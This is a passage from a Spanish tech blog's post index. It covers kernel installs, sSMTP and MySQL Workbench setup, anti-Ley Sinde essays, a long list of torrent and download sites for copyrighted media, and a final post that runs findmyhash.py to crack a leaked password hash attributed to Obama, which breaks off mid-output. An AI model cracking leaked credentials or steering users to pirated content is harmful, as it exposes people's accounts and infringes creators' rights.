casos, volver a reinstalar las aplicaciones o los controladores puede funcionar. Instalamos module-init-tools , una herramienta para gestionar módulos del kernel que se encuentra en los repositorios, que puede evitar que nos aparezcan algunos errores y avisos. El kernel lo podemos descargar de kernel.ubuntu.com . En este caso vamos a descargar la versión 3.2.1 Precise PAE de 32 bits, así que descargamos los paquetes. linux-headers-all linux-headers-generic-pae_i386 linux-image-generic-pae_i386 bash $ mkdir ~/Downloads/kernel-v3.2.1-precise $ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.2.1-precise/linux-headers-3.2.1-030201_3.2.1-030201.201201121644_all.deb $ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.2.1-precise/linux-headers-3.2.1-030201-generic-pae_3.2.1-030201.201201121644_i386.deb $ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.2.1-precise/linux-image-3.2.1-030201-generic-pae_3.2.1-030201.201201121644_i386.deb Los instalamos en ese mismo orden: bash $ sudo dpkg -i linux-headers-3.2.1-030201_3.2.1-030201.201201121644_all.deb $ sudo dpkg -i linux-headers-3.2.1-030201-generic-pae_3.2.1-030201.201201121644_i386.deb $ sudo dpkg -i linux-image-3.2.1-030201-generic-pae_3.2.1-030201.201201121644_i386.deb Sólo queda reiniciar para poder probar el nuevo kernel. Actualizado el 13 de marzo de 2012 He subido un pequeño script que permite automatizar este proceso . Comprueba la versión del kernel que tenemos instalada y si hay una nueva versión, la descarga y, si así lo queremos, la instala. Un ejemplo: bash $ install-new-kernel.sh [+] Checking 'http://kernel.ubuntu.com/~kernel-ppa/mainline/' for a new version... [+] New version 3.2.11 available. [+] Checking 'http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.2.11-precise/' for packages... [+] Downloading 'linux-headers-3.2.11-030211_3.2.11-030211.201203131335_all.deb'... [+] Downloading 'linux-headers-3.2.11-030211-generic-pae_3.2.11-030211.201203131335_i386.deb'... [+] Downloading 'linux-image-3.2.11-030211-generic-pae_3.2.11-030211.201203131335_i386.deb'... [+] Do you want to install them now? (y/n) y","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/01/26/instalacion-de-un-nuevo-kernel-ppa-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2012/01/26/instalacion-de-un-nuevo-kernel-ppa-en-ubuntu/"},{"title":"Configurar sSMTP para enviar correo mediante GMail desde el terminal","text":"Con esta receta, podremos enviar correos electrónicos desde el terminal sin necesidad de tener instalado un servidor de correo, simplemente utilizando una cuenta de GMail y sSMTP, que se encuentra en los repositorios. Esta opción puede estar bien para enviar correos desde un sistema que utilizamos sólo nosotros, pero no es un sustituto de un servidor de correo como Sendmail, Exim o Postfix. Para configurarlo, editamos el fichero /etc/ssmtp/ssmtp.conf y añadimos las siguientes líneas al final del mismo: bash AuthUser=johndoe@gmail.com AuthPass=SGsA97wdhA92Dd FromLineOverride=YES mailhub=smtp.gmail.com:587 UseSTARTTLS=YES UseTLS=YES Hay que tener en cuenta que nuestra contraseña está escrita en texto plano, y que cualquier persona con privilegios de administrador, o que esté usando nuestra cuenta, tendría acceso a ella. Lo siguiente será parar sendmail , deshabilitarlo y sustituirlo por ssmtp : bash $ sudo service sendmail stop $ sudo chkconfig sendmail off $ sudo mv /usr/sbin/sendmail{,.bak} $ sudo ln -s /usr/sbin/ssmtp /usr/sbin/sendmail Si quisiéramos recuperar sendmail , deberemos realizar los pasos en orden inverso: bash $ sudo mv /usr/bin/sendmail{.bak,} $ sudo chkconfig sendmail on $ sudo service sendmail start Para probarlo, basta ejecutar: bash $ echo \"Lorem ipsum\" | mail -s \"Lorem\" johndoe@gmail.com Si nos sale que no reconoce el comando mail , podemos instalar el paquete bsd-mailx . Si tenemos alguna aplicación que nos envía un correo local, a un usuario del sistema, éste no será accesible y la cuenta de GMail desde la que enviamos el correo recibirá un notificación de envío fallido. GMail incluye en los mensajes las siguiente cabeceras: bash Received: by 10.216.138.89 with SMTP id z67mr1808982wei.10.1328051201592; Tue, 31 Jan 2012 15:06:41 -0800 (PST) Return-Path: Received: from myhostname (21.48.29.25.dynamic.ip.es. [25.29.48.21]) by mx.google.com with ESMTPS id n5sm67537993wiw.7.2012.01.31.15.06.38 (version=TLSv1/SSLv3 cipher=OTHER); Tue, 31 Jan 2012 15:06:40 -0800 (PST) Message-ID: <4f287400.e54cb40a.54de.ffff801c@mx.google.com> Received: by myhostname (sSMTP sendmail emulation); Wed, 01 Feb 2012 00:06:36 +0100 Podemos ver que en las cabeceras Received se incluye el nombre de nuestro equipo, la IP que teníamos y el nombre del MTA que hemos utilizado, sSMTP , por lo que el receptor tiene información acerca de quién envió el correo. Referencias » How To Use Gmail Account To Relay Email From a Shell Prompt | Via L'home dibuixat","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/01/14/configurar-ssmtp-para-enviar-correo-mediante-gmail-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2012/01/14/configurar-ssmtp-para-enviar-correo-mediante-gmail-desde-el-terminal/"},{"title":"#ComparteCultura","text":"La recopilación de la lista original de #ComparteCultura es obra de @kurioso y está en #ComparteCultura . En 1980 la industria discográfica británica realizó una campaña antipiratería con el slogan \" Home Taping Is Killing Music \". 30 años más tarde la música está más viva que nunca y lo que está muriendo es la industria, que reclama el 'lucro cesante' de un negocio de intermediación descaradamente obsoleto. Hay que meterse en la cabeza: Compartir no es delito . Descargar no es delito . Copiar no es robar . La industria quiere meterte miedo. ¿Cómo podemos ejercer nuestros derechos? Comparte, descarga y copia la siguiente lista de recursos culturales. Comparte en Twitter . Pega en Facebook . Envíala por email. Complétala en tu blog. Llévate la lista. PDF , DOC , HTML Esta lista es una respuesta natural al recorte de derechos de la nueva ley SINDE ( Así va a funcionar ) , futura SOPA y similares y a la falta de ofertas justas de contenidos culturales accesibles; a una necesaria purga de intermediarios, comisionistas y parásitos del negocio anticuado que no han sabido adaptarse a las nuevas tecnologías para mantener su nicho, y que impiden un consumo responsable sin sentirse estafado y una justa contraprestación al que verdaderamente se lo merece; el autor de las obras. Juro q no descargo música desde que existe Spotify, es absolutamente innecesario. Juro q no pago por ver series, es absolutamente imposible \" Kurioso (@kurioso) January 04, 2012 El 'todo gratis' sigue siendo la falacia de los que quieren controlar la industria y criminalizar siempre a los consumidores. El acceso libre y responsable a contenidos gratuitos es solo el camino espontáneo para promocionar los mismos y, más tarde, poder premiar responsablemente a sus autores comprando, regalando o recomendando sus trabajos. Durante años se ha estado pagando siempre a ciegas. Ahora hay mecanismos legítimos para hacerlo de una manera más natural y coherente. Nadie en su sano juicio puede defender la sostenibilidad de la cultura con gratuidad de los contenidos, pero el derecho del autor a vivir de su obra es tan importante como el acceso universal a la misma. Si enlazar a paginas que enlazan a contenidos con derechos de autor es delito. Enlazar a Google es delito #ComparteCultura \" Kurioso (@kurioso) January 09, 2012 Aparte de Spotify, Grooveshark, RTVE y otras ofertas con contenido gratuito que compensan de alguna forma a los autores, el criterio para completar esta lista colaborativa ha sido poner en común, entre muchos usuarios de la red, las herramientas y webs necesarias para poder ejercer el derecho a compartir libremente__sin más ánimo de lucro__ que el imprescindible para el mantenimiento de los sistemas necesarios que lo hagan posible; y que estén servidas por proveedores de alojamiento fuera de España donde no puedan cerrar mediante la legislación española. Todo ello para demostrar, entre otras cosas, que es quimérico y prácticamente imposible el control de Internet sin censurar y lesionar derechos fundamentales; generando también mayor interés por la cultura y potenciando, en consecuencia, el consumo y la distribución posterior de más bienes culturales. Entrada reservada para ver a Les Luthiers. Será la cuarta vez que lo hago en vivo. ¿Que cómo los conocí? Con una copia que mató la cultura. \" David Bravo (@dbravo) January 05, 2012 Lista de contenidos culturales gratuitos accesible desde la red P2P La mejor forma de ejercer tu derecho a compartir con otros usuarios de la red es el [P2P (Peer-to-Peer)][]. El P2P sirve para intercambiar información de forma directa, sin intermediarios ni webs, entre dos o más usuarios de la red. De la misma forma que hace 30 años dejabas una casete 'rulase' entre los compañero de colegio, hoy se han optimizado las herramientas para ejercer exactamente el mismo derecho. Es una actividad legítima, no punible y que debe escapar del control de cualquier gobierno para que se garantice la neutralidad de Internet. Hasta desde el [Ministerio de Cultura español, la SGAE, Moncloa][], y [desde el Senado][] lo han utilizado para bajar contenidos 'protegidos' con derechos de autor. ** ** > No quiero que sea gratis. Quiero que sea justo. [#ComparteCultura][1] > > \" > (@esaotra) [January 09, 2012][2] Mediante un programa, o cliente, el usuario puede compartir su material cultural con otros usuarios dividiendo en paquetes esa información y alojándola en varios trackers (servidores anónimos) para que mediante un _torrent_ (pequeño archivo con la dirección de esos paquetes) puedan descargárselos otros usuarios. De tal forma que para encontrar cualquier contenido cultural solo hace falta buscar estos pequeños archivos o, en adelante, 'torrents'. Algunos de los clientes torrents más conocidos son: Transmissionbt , Vuze , Utorrent , Bitcomet , Delunge , aMule , Bittorrent , Ares , Bitspirit , Faroo ,¦ También útiles los gestores de descargas directas como: Jdownloader , Flashget , Rapget , Internet download manager , Download Acelerator , Tucan o Cryptload . Algunos de los mejores buscadores de torrents: Mininova.org , Elitetorrent , Torrents , Torrentportal , Torrentmatrix , Isohunt. Thepiratebay.org . Si no lo encuentras aquí, es muy probable que no exista. Torrentbutler . Un buscador solo de torrents para películas en HD. Entorno visual muy cuidado » Torrent-finder . Buscador de buscadores. Gestiona tu consulta entre más de 150 buscadores. Torrentz . Otro meta-buscador sencillo y práctico Música Google . Sí, el gran buscador también es un 'recopilador voluntario y con ánimo de lucro de enlaces directos a descargas musicales'. Solo hay que tener cierta pericia a la hora de buscar enlaces a MP3 , por ejemplo. Aquí te enseñan varios trucos para buscar por tipo de archivo . ¿Cerrará la Ley Sinde también el gigante google? Spotify . Un clásico. Referente para el nuevo modelo de negocio en la industria musical. Una forma de disfrutar de la música gratuitamente con beneficio directo para el autor. También opción de pago muy recomendable para llevarlo en tu dispositivo móvil. Desde que uso esta oferta 'racional' no he vuelto a descargar música. __ Last.fm **. El padre de Spotify sigue dando guerra. Música gratuita con una estupenda red social de recomendaciones. Goear . Opción nacional . Un poco denostada, pero con un gran catálogo musical. Puedes escuchar desde los últimos éxitos internacionales a bandas noveles sin intermediación carroñera. Dispone de aplicaciones para el iPad, iPhone y Android Rhapsody . Un servicio de streaming musical tipo 'Spotify' pero limitado a territorio norteamericano. Con un pequeño truco podéis disfrutarlo utilizando una IP americana. Deezer . Una de las pioneras en ofrecer música en streaming de manera gratuita. Comenzó a funcionar en 2006 bajo el nombre de BlogMusik. Dice ofrecer un catálogo de 10 millones de pistas. Para disfrutar de su música en Android o iPad / iPhone hay que pagar la suscripción premium , como en Spotify Grooveshark . 30 millones de usuarios avalan esta red social que permite buscar y subir música de forma libre y gratuita y sirve también de promoción a artistas noveles. Aquí algunos trucos para descargar la música a tu disco duro y hacer la red más 'social'. Noisetrade . Una web con miles de discos, completamente gratis y legales, para promocionar a artistas noveles y no tan novatos. Las producciones son buenas y la plataforma está exquisitamente diseñada. Bucear en ella para dejarse llevar solo por la música sin prostituciones comerciales es un deporte imposible de practicar hace años. ¡Practícalo! Gratismusica Foro en el que sus usuarios envían enlaced de megaupload y rapidshare sobre todo tipo de música. Songr es una aplicación (windows) que utiliza 16 buscadores para localizar, reproducir y descargar archivos mp3 y otras fuentes de música como youtube. Jamendo Un clásico. 300.000 temas de música libre, legal e ilimitada de autores dispuestos a compartir su trabajo bajo licencia Creative Commons y dejando fuera al aparato distribuidor. Series, películas y documentales Google . Sí. Volvemos a la página más 'pirata', 'criminal' e 'ilegal' de todas. La empresa de tecnología web que más factura del mundo. Entre otras cosas indexando automáticamente enlaces a archivos con derechos de autor y alojados en webs de terceros. Justo lo que persigue la Ley Sinde . ¿No quieres usar ninguna otra web que haga lo mismo? Tranquilo, no es necesario. Busquemos, por ejemplo, todos los torrents a la cuarta temporada completa de la serie \"The Big Bang Theory\". Primero en versión original , o si preferimos en castellano . ¡Ojo a la caja de búsquedas! Puedes sustituir \"megavideo.com\" por algún otro servicio de alojamiento de archivos que indexe directamente en google; como \" downupload.com \", \" uploaded.to \" o \" Bitshare.com \", Si no puedes buscar directamente en un buscador que indexe megaupload y rapidshare. Series.ly . Herramienta social para compartir todo lo referente a series y películas. Agenda, enlaces a descarga directa y streaming , reproductor propio. Necesita invitación. Epoilertv . Una de las mejores bases de datos en español sobre series de televisión sin ánimo de lucro. Con agenda para recordar y marcar las ya vistas y, lo que es más importante, enlaces a las descargas directas o streaming de nuestros capítulos preferidos. Serieonline Enlaces a Series, películas y una buena sección de documentales. No tiene publicidad ni ánimo de lucro . Archive.org 60.000 películas de dominio público. Documentales, conciertos, documentos históricos, dibujos animados¦ En inglés. Teledocumentales . Documentales en castellano de frecuente actualización y muy bien clasificados. Visión online. Para perder horas y horas. Documentary24 Una de las mejores recopilaciones particulares de documentales gratis en la red. En inglés Youtube Movies Películas gratis y 'legales'. La colección es deprimente pero alguna puede valer millones cuando las leyes no nos dejen alternativas para ver el resto. Ted Talks . Imprescindible. La mejor forma de divulgación de tecnología, entretenimiento y diseño en forma de charlas gratuitas al alcance de todos. Varios idiomas. Subtítulos. Docuciencia . Recopilación de todo tipo de documentales de ciencia y tecnología. A un solo clic. Eso es divulgar. Foofind.com Buscador de archivos de descarga creado por el desarrollador español Pablo Soto . No sin obstáculos . Incluye redes P2P. Una forma más cómoda, sin pasar por terceros, de acceder a tus contenidos audiovisuales favoritos. Adnstream . Más de 300 películas de cine de acción, Clásico V.O, Bélico, western y GRATIS. Hdcity . Uno de los tracker privados, sin ánimo de lucro ni publicidad, más usados en España. Necesita invitación y cierto compromiso para compartir, no solo descargar. Hace poco cambiaron su dominio para hacer frente a la Ley Sinde . Enlaces a películas en HD. Eztv.it . Una joya. Foro con información actualizadísima de series. Sin duda una de las mayores comunidades mundiales para compartir audiovisuales de BitTorrent. En inglés. Necesita registro. No para ver los torrents. Liberateca Series . No tiene una gran oferta, pero lo que hay está muy bien organizado y accesible. Divxclasico . ¿Cansado de buscar películas que tengan más de 10 años? Para los amantes del cine clásico. Un foro imprescincible, con enlaces a torrents e intercambio de información sobre el cine más olvidado. Imprescindible para comprender y mantener vivo los orígenes del séptimo arte. Elitefreak . Torrents a 4.500 películas, más de 1.000 series y 130 documentales; foro, clasificaciones, favoritos. Una de las webs más usadas para compartir y disfrutar de archivos con contenido audiovisual en España. __ Descargardocumentales . __National Geographic, Discovery Channel, Canal Historia, Odisea ¦ enlaces a descarga de las mejores series de documentales. Estupenda. Youtorrent . Buscador torrent combinado con una base de datos de series y películas. Muy bueno. En inglés. Pelis24 . Colección de enlaces a películas dobladas, en versión original y subtituladas. __ Forosdz .** Foro de_Anime, Manga, Hentai, Yaoi, Cosplay_¦(a partir del 3 me pierdo). Para auténticos frikis MejorenVO . Ideal para practicar idiomas. Todas las series y películas en versión original con subtítulos. Con manual básico para configuración de los mismos . Solo-free . Foro de películas bastante ordenado y clasificado . La sección de series es meramente testimonial¦ Ev0.in . Un estupendo recopilador de enlaces de series en versión original y a varias resoluciones. Solo eso, nada más. Ni un solo anuncio. Tusseries.com . Otro foro español, sin ánimo de lucro, con una gran colección de enlaces. Destaca su base de datos de serie españolas. Necesita registro. Televisión Online. Alacarta . de RTVE, una oferta 'legal' y ejemplo de como una televisión pública se puede adaptar sin problemas a los nuevos medios. Series de producción propia , documentales , música ¦ En su contra: no se pueden descargar y solo son visibles a través de su web __ Tutelevisiononline **. Recopilación de enlaces a streaming de televisiones de más de 100 países. Medinalia . 1.600 canales de televisión y 5200 estaciones de radio en vivo. Viewmy.tv . Una plataforma de vídeo online independiente que sirve señal de 120 países. Buscador muy completo. Teledirecto . Recopila la señal de las cadenas que la sirvan en su web, enlazando directamente a ellas. Muy útil. Libros, periódicos y cómics. Google , de nuevo, pone a tu disposición y con una sencilla búsqueda por tipo de archivo (filetype:epub) miles de ebooks en castellano . Sin restricciones, sin censuras, para todos¦.¡¡¡CIERREN GOOGLE, POR FAVOR, ESTA MATANDO LA CULTURA!!! Si quieres hacer una búsqueda más específica con criterios no facilitados directamente por el buscador, puedes usar 'Google Hacks' . Bing . El buscador de Microsoft, también pone a tu disposición otros 7.000 enlaces a ebooks Calibre . Un programa gratuito e imprescindible para gestionar y cambiar el formato digital de los ebooks y poder cargarlos en tu lector de libros electrónicos. Imprescindible para hacer más práctico el Kindle y no depender sólo de la tienda de Amazon. Librosparakindle . Como su nombre indica, pequeño blog con enlaces a 300 libros ya convertidos a mobi, el formato de Kindle. Colecciones casi completas de Agatha Christie, Arthur C. Clarke, Brian W. Aldiss, Carl Sagan, Reverte ¦ Manual de desobediencia a la Ley Sinde . \"Aprende a cambiar tus DNS, a configurar un proxy, a configurar y utilizar Tor para navegar anónimamente, a entender para qué sirve una red privada virtual (VPN), \"¦ todo lo necesario para ejerder tus derechos de copia privada y una Ley tan inútil como injusta. Desarrollado por Hacktivistas y editado por ' Traficantes de Sueños ' y el periódico Diagonal . Librosenepub 3.000 enlaces a libros de todo tipo en formato epub. Incómodo de buscar pero buena compilación. Open Library . Un buscador, iniciativa de Internet Archive , que indexa desde las grandes bases de datos de internet para acumular 1.000.000 de libros gratis. Sí ¡un millón! La mayoría en inglés pero también tienes 11.000 en Español . Ofrece un potente buscador para texto incluido en las obras. Ideal para investigar fuentes y amantes de la literatura clásica Gutenberg . 36.000 ebooks ( muchos en español ) en libre descarga. Formatos soportados; Kindle, Android, iPad ¦ Los más descargados Epubgratis.me . Más de 2000 ebooks recientes en formato ePub. Muy buena interface . Sin publicidad. Una joya altruista. 24symbols . Proyecto enteramente español. El \"Spotify de los libros\". Ofrece un catálogo contemporáneo de obras gratuitas, financiándose con publicidad y cuentas premium. Muy buena idea aunque los libros deberás leerlos directamente 'online' en la web o en la aplicación para iPad . Para descargártelos o leer 'offline' necesitas la cuenta premium.(9‚¬ mes) Bookcamping . Un catálogo-biblioteca abierto y colaborativo con temática social y surgida a raíz del movimiento 15M. Sólo son descargables los que tienen una marca blanca en la ficha. » 1libro1euro . 30 libros gratis de autores contemporáneos a cambio de una donación voluntaria por una buena causa. Youkioske.com . Quizás la mayor comunidad para compartir prensa y publicaciones. Le sobra publicidad. Imperdible. __ Issuu , Scribd y Calaméo .__Tres formas de publicar y leer todo tipo de revistas, libros y documentos. Pordescargadirecta . Foro de Prensa diaria, revistas y magazines. Sin publicidad Quioscovagos . Foro con enlaces a toda la prensa y revistas que se edita en España Premiomag . 1.300 enlaces a revistas de 5 paises. Desde el National Geographic al New Yorker . No hay editadas en España. Libroteca.net . 10.000 libros, la mayoría en español, libres de derechos de autor. Bibliotheka.org . 140 millones de páginas vistas. Biblioteca general sin ánimo de lucro. Más de 60.000 títulos en Pdf y en castellano; clasificados por temáticas y autores . La web es rancia, el contenido, una joya. Quedelibros.com . Una comunidad donde los usuarios colaboran compartiendo la información que han encontrado en Internet. Clasificación de los autores y obras más leídas. __ Papyrefb2 **. Más de 2500 libros en formato papyre . Buena clasificación. Sin publicidad. Liberateca books . Oferta limitada pero con una 'interface' muy intuitiva, moderna y clara. Sin publicidad. Elaleph.com . Nace con la necesidad de conseguir textos en español en Internet para investigación. Cuenta con una biblioteca digital de más de 2.000 títulos. Colecciones digitales de las Bibliotecaas Nacionales . Manuscritos digitalizados, cientos de incunables , fondos culturales, catálogos publicados, lenguas territoriales¦ todo lo necesario para cualquier filólogo o ratón de biblioteca clásica y de dominio público¦ Biblioteca digital hispánica ¦ Millones de documentos digitalizados por la Biblioteca Nacional para agilizar las búsquedas y facilitar la difusión de cultura de dominio público. Literatura , Música impresa , documentos sonoros , material cartográfico ¦ Librodot.com . 11.000 obras libres de derechos de autores clásicos, poco conocidos o inéditos. Manuales científicos y tesis doctorales. Manybooks . Libros de dominio público en 40 idiomas. También en español. Feedbooks.com . Gran colección en inglés de obras contemporáneas de dominio público. Lamansion . Comunidad de cómics editados en español. Marvel, DC, Chaos, clásicos¦ Liquidcomics . es una editorial internacional de cómics gratuitos que se pueden leer online. Patrocinada por Sir Richard Branson _ ofrece obras del director John Woo, Guy Ritchie_ o del mismísimo Wes Craven . Marvel . La gigantesca editorial de cómics americana puso en su día a disposición de todo el mundo, 250 cómics gratuitos para promocionar su tienda online, Digital Comics Unlimited . Claro que la mejor manera de promoción es tener acceso a la colección completa de cómics de la editorial. Desde el año 1960 hasta el 2010. Para luego elegir cuáles comprar. Puedes descargarte aquí los enlaces torrents. Novaro . Un pequeño blog donde poder encontrar enlaces de descarga a cómics antiguos de la editorial Novaro 1949-1984 (Fantomas, Batman, Archie, La pequeña Lulú, etc.) Libroscompartidos.com . Curiosa iniciativa para intercambiar con otros lectores aquellos libros en papel que ya has leído y solo hacen 'biblioteca'. Muy interesante. Librosmaravillosos.com . Un descubrimiento personal. Una pareja de autores decidió un día recopilar, en formato digital, todos aquellos libros que habían supuesto un gran impacto durante su aprendizaje y formación. Una colección estupenda de libros científicos y de curiosidades, para todas las edades, elegidos por el azar que supone cada proceso personal de adiestramiento. Genial. Orsai . Quizás el mejor proyecto para explicar el cambio del modelo industrial que urge con la llegada de la tecnología digital. Paradójicamente es una revista en papel, sin publicidad, sin intermediarios, que paga justamente a sus colaboradores y que al final se regala en soporte digital. Funciona y muy bien. El admirado Hernán Casciari lo explica estupendamente en esta TED Ciencia y Cultura. Freefullpdf . Buscador en PDF de más de 80 millones de artículos científicos de Medicina, Biología, Física, Patentes. Imprescindible para investigadores Base de datos de la Unesco . Todas las publicaciones editadas por la organización desde 1945. Educación, ciencias naturales, ciencias sociales y humanas, cultura¦ Con un buscador fabuloso Pubmed . Buscador que indexa más de 21 millones de estudios de literatura médica extraídas de la red Medline . Algunas referencias a estudios completos y descargables, otras te llevan a su publicación original. Scielo . Biblioteca virtual formada por una colección de revistas científicas españolas de ciencias de la salud. Eoi . La Escuela de Organización industrial pone a disposición, con licencia_creative commons_, cientos de libros, informes, conferencias seminarios y monografías sobre economía e innovación empresarial. » Scirus . Buscador de documentos científicos con más de 440 millones de entradas. En inglés. Google Scholar . Buscador para artículos de revistas científicas, enfocado en el mundo académico, y soportado por una gran base de datos de dominio público. Almacenamiento virtual. Wuala . Disco duro virtual para compartir tus archivos con quien quieras. 2gb de espacio gratuito Dropbox . El servicio más conocido de alojamiento de archivos multiplataforma en la nube. 2gb. Un tutorial para hacer tus copias de seguridad SoulSeek . El clásico disco duro abierto a la comunidad. Un poco en desuso. Pero para música es muy práctico. Minus . Para compartir en comunidad vídeos online. Límite de hasta 10gb Esnips . Ofrece hasta 5GB de almacenamiento en la nube Adrive . 50Gb de almacenamiento gratuito. Sí ¡¡¡50!!! La mayor oferta de la red. Pequeños proyectos. De todo un poco. Joyas de la red. Gilipolladas del kigonjiro . Música de conciertos, actuaciones en directo que no podrás encontrar en las tiendas. Ninguno de los DVD o CD de la página han sido publicados oficialmente, sino que han sido cedidos por los artistas. Hay pequeños tesoros, como este concierto de Siniestro Total y Loquillo ¦ Qomun . es un directorio y plataforma de promoción de cultura libre, construido con la colaboración de sus lectores. Música, vídeo, software, literatura, imagen¦ Horrortheque . Películas de terror de dominio público. Impresionante colección. En inglés. Sideravisus . Una de las joyas de esta lista. Biblioteca personal y virtual enfocada principalmente a autores de ciencia ficción. Tiene grandes (y actuales) clásicos como 1984 e importantes e imprescindibles series de culto, como las de Asimov . Choralwiki . Para compartir partituras de música coral. Muy curioso. Amateurshotel . \"gente apasionada por la fotografía, la ilustración, el diseño, los relatos cortos, microrelatos o poemas ¦ que llena sus ratos libres (y no tan libres) escribiendo, pintando, fotografiando¦y compartiendo sus obras\" Librodenotas . Pequeña pero cuidadísima editorial que publica ebooks gratuitos seleccionados con su sabio criterio para ofrecer calidad antes que cantidad. Piden una donación de 1‚¬ por obra. Webcomics . Pequeña comunidad, sin ánimo de lucro, que se dedica a promocionar los webcómics escritos en castellano. De momento tienen una base de dato de casi mil webs. Un placer navegar por algunas joyas . Mjlopezz . 34 libros, guías y manuales gratuitos sobre marketing y social media P2pu.org . Muy interesante. La universidad 'Peer to Peer'. Comunidad que utiliza el soporte P2P para crear proyectos educativos de aprendizaje colaborativo. Tienes cursos desde ' programación básica en HTML5 ' a ' dibujo a lápiz ' Ebooksgratis . Blog que se dedica a recopilar libros gratis y libres para aunar intereses entre lectores que buscan ebooks y escritores y/o editoriales que desean que sus ebooks sean encontrados. Encomiable. Artesuniversales . Pequeño blog con enlaces y reseñas de grandes 'Best Sellers' y novelas clásicas y contemporaneas . En formato ebook. Esta lista no hubiera sido posible sin la ayuda de decenas de personas que han compartido sus vicios y costumbres culturales en Twitter . Es básico que juntos luchemos contra una ley española injusta, utópica, que solo busca censurar y generar sentimiento de miedo y culpa; y que no defiende los derechos de todos por igual. Se trata de construir libremente y con las herramientas que nos ha tocado disfrutar, una comunidad capaz de compartir bienes culturales sin ánimo de lucro. Recuerda: \"No hay autores poco consumidos por culpa de la piratería. Hay malos autores buscando excusas para no adaptarse a una industria más justa\" Ayúdenme a completar la lista en los comentarios. Copiad el texto en otras fuentes. Compartid por email con vuestros contactos¦ \"1\"","tags":"memo","url":"https://karpoke.ignaciocano.com/2012/01/11/compartecultura/","loc":"https://karpoke.ignaciocano.com/2012/01/11/compartecultura/"},{"title":"Instalando MySQL Workbench desde el código fuente en Ubuntu Oneiric Ocelot","text":"MySQL Workbench es una herramienta que permite diseñar y administrar una base de datos MySQL y proporciona herramientas para la configuración del servidor y la administración de los usuarios. MySQL Workbench no se encuentra en los repositorios de Ubuntu, y desde la página de descargas todavía no hay un paquete para Ubuntu Oneiric Ocelot (11.10). Instalación Para instalar MySQL Workbench, primero nos bajamos el código fuente. Ahora mismo, la última versión es la 5.2.37. bash $ wget http://dev.mysql.com/get/Downloads/MySQLGUITools/mysql-workbench-gpl-5.2.37-src.tar.gz/from/ftp://ftp.inria.fr/pub/MySQL/ Comprobamos el fichero: bash $ md5sum mysql-workbench-gpl-5.2.37-src.tar.gz c7301f078834512538353ee3ce2cf460 mysql-workbench-gpl-5.2.37-src.tar.gz Los descomprimimos: bash $ tar xvzf mysql-workbench-gpl-5.2.37-src.tar.gz $ cd mysql-workbench-gpl-5.2.37-src Configuramos el paquete: bash $ ./configure Esto, además de configurar el paquete, nos avisará de cualquier dependencia requerida que no tengamos instalada. En este caso: bash $ sudo aptitude install libzip-dev libgtkmm-2.4-dev libsqlite3-dev uuid-dev liblua5.1-0-dev libctemplate-dev Una vez terminado sin errores, ya podemos compilar: bash $ make Antes de instalarlo, podemos realizar una comprobación: bash $ make check Y ya podemos instalarlo: bash $ sudo make install","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/01/10/instalando-mysql-workbench-desde-el-codigo-fuente-en-ubuntu-oneiric-ocelot/","loc":"https://karpoke.ignaciocano.com/2012/01/10/instalando-mysql-workbench-desde-el-codigo-fuente-en-ubuntu-oneiric-ocelot/"},{"title":"La red resiste","text":"La red resiste . Hace exactamente dos años tuvimos conocimiento del anteproyecto de Ley Sinde. Gran parte de la ciudadanía señaló de inmediato su rechazo en las redes a través del # manifiesto por los derechos fundamentales en Internet . En estos 24 meses el debate social sobre esta iniciativa ha sido intenso y ha aglutinado a ciudadanos y organizaciones preocupados por la merma de derechos y libertades. Ahora, pocos días después de haber sido deslegitimado por las urnas, un gobierno moribundo pretende aprobar el reglamento que desarrolla esta ley en abierta connivencia con el gobierno entrante. La Ley Sinde tendrá numerosos efectos indeseados: al introducir una fuerte inseguridad jurídica en la regulación de Internet, se dificulta gravemente la actividad de los emprendedores tecnológicos que el Partido Popular pretende que contribuyan a reactivar la economía. La redacción de la Ley Sinde señala claramente que se aplica a todos los servicios de la sociedad de la información; no deben confundirnos los mensajes que afirman que su única razón es la de cerrar webs de descargas. Nada es peor para el crecimiento de un mercado que la inseguridad de no saber si al día siguiente un negocio puede ser cerrado por la aplicación arbitraria de una norma en manos del gobierno de turno. El panorama de la propiedad intelectual en nuestro país es atroz: la Embajada de los Estados Unidos ha impuesto la aprobación de la Ley Sinde, el canon digital a empresas y administraciones fue declarado ilegal por el Tribunal de Justicia de la Unión Europea pero tras año y medio se sigue pagando, los antiguos dirigentes de la SGAE -siempre defendida por el Ministerio de Cultura- se hallan imputados en la Audiencia Nacional por el saqueo generalizado del dinero de los autores. Este panorama cuadra con el general: una corrupción política extendida y no censurada en las urnas, unida a la subordinación de la democracia a los intereses de unos pocos con nombres y apellidos a los que sin embargo se les llama \"mercados\". Sólo con inteligencia, diálogo y trabajo se pueden resolver los actuales retos de la propiedad intelectual y comenzar a construir una salida a la preocupante situación económica actual. Como el Tribunal Europeo de Justicia , entendemos que la tensión entre la propiedad intelectual y la libertad de empresa, el derecho a la privacidad y el derecho a recibir o emitir información ha de resolverse en favor de estos tres últimos derechos. Será la única manera de crear riqueza y de mantener las libertades que tanto ha costado conseguir. Frente a la arbitrariedad, la defensa histórica de la ciudadanía ha consistido en asegurar la garantía de los derechos fundamentales sustrayéndolos de la política, esto es, de los poderes de la mayoría y del mercado: se trata de derechos inviolables, indisponibles e inalienables. Los gobiernos van y vienen. La red resiste. \"La red resiste\"","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/12/02/la-red-resiste/","loc":"https://karpoke.ignaciocano.com/2011/12/02/la-red-resiste/"},{"title":"La contraseña del presidente Obama","text":"En un tweet de @AnonNewsSource han publicado el usuario y el hash de la contraseña de Obama: Obama WEB http://whitehouse.gov barack.obama@whitehouse.gov / PASS: 6289c5975815012768aefbf9a8d2fd3e / LOGIN: bobama PHONE +1 202-456-1111 Podemos utilizar el script findmyhash.py para ver si encuentra la contraseña asociada a ese hash : ```bash $ python findmyhash.py md5 -h \"6289c5975815012768aefbf9a8d2fd3e\" -g Cracking hash: 6289c5975815012768aefbf9a8d2fd3e Analyzing with joomlaaa (http://joomlaaa.com)... ... hash not found in joomlaaa Analyzing with md5-lookup (http://md5-lookup.com)... ... hash not found in md5-lookup Analyzing with 